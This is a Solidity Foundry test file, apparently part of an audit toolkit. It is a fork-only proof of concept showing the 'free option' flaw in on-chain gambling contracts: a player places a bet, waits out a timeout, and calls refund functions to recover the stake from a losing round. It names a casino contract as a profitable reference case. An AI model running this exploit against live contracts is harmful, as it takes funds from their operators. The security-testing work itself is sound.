// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Optional settlement (the free option)
/// @notice Detector: settlement-optionality. The entropy can be perfect and
///         the game still loses: if a player may SETTLE a winning round and
///         REFUND a losing one after a timeout, the loss is free, so the bet
///         is a call option on the win condition.
/// @dev FORK-ONLY. Reference case: BlockChainCasino (the one genuinely
///      profitable finding in the eight-game weak-randomness set).
///      `commit = keccak256(reveal)` binds the reveal and cannot be ground;
///      the flaw is that refundBet() returns the FULL stake after
///      BET_EXPIRATION_BLOCKS while nothing on the house side forces
///      settlement. Win -> settleBet. Lose -> refundBet.
///      Copy to foundry/test/Exploit.t.sol and run via scripts/run-fork-poc.sh.
///      The verdict is the OBSERVABLE: after a losing round and a timeout, the
///      player's balance is back where it started (the stake returned), never
///      that a refund call returned.
contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    /// The stake the harness commits. Kept small so the assertion is about
    /// the stake coming BACK, not about winning.
    uint256 internal constant STAKE = 0.01 ether;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_freeOption() public {
        address player = makeAddr("player");
        vm.deal(player, 1 ether);
        uint256 startBalance = player.balance;

        // 1. Place a round. The stake goes in; whether it is a win is decided
        //    by the game, and this harness does not need to know.
        string[4] memory betEntries = ["bet()", "play()", "enter()", "roll()"];
        bool placed = false;
        for (uint256 i = 0; i < betEntries.length && !placed; ++i) {
            vm.prank(player);
            (bool ok,) = target.call{value: STAKE}(abi.encodeWithSignature(betEntries[i]));
            if (ok) {
                placed = true;
                console.log("round placed through", betEntries[i]);
            }
        }

        // 2. Wait out any refund window. Both clocks move: games gate on
        //    block.number and on block.timestamp in roughly equal measure.
        vm.roll(block.number + 10_000);
        vm.warp(block.timestamp + 30 days);

        // 3. Try to take the stake back without settling.
        string[4] memory refundEntries = ["refund()", "cancel()", "abandon()", "withdrawBet()"];
        bool recovered = false;
        for (uint256 i = 0; i < refundEntries.length && !recovered; ++i) {
            vm.prank(player);
            (bool ok,) = target.call(abi.encodeWithSignature(refundEntries[i]));
            // The observable: the stake is back, i.e. the round cost nothing
            // but gas even though it was not settled as a win.
            if (ok && player.balance + STAKE > startBalance) {
                recovered = true;
                console.log("stake recovered through", refundEntries[i]);
            }
        }

        console.log("player balance start/now:", startBalance, player.balance);

        assertTrue(
            placed && recovered,
            "the round did not yield a free refund. Tried bet(), play(), enter(), roll() to place the round and refund(), cancel(), abandon(), withdrawBet() after rolling 10,000 blocks and 30 days. This does NOT establish safety: the entry points may have other names or take arguments, the round may need a commitment first, or the game may force settlement on a house-side path (which would make the option worthless). Read the target's settle/refund pair before concluding."
        );
    }
}
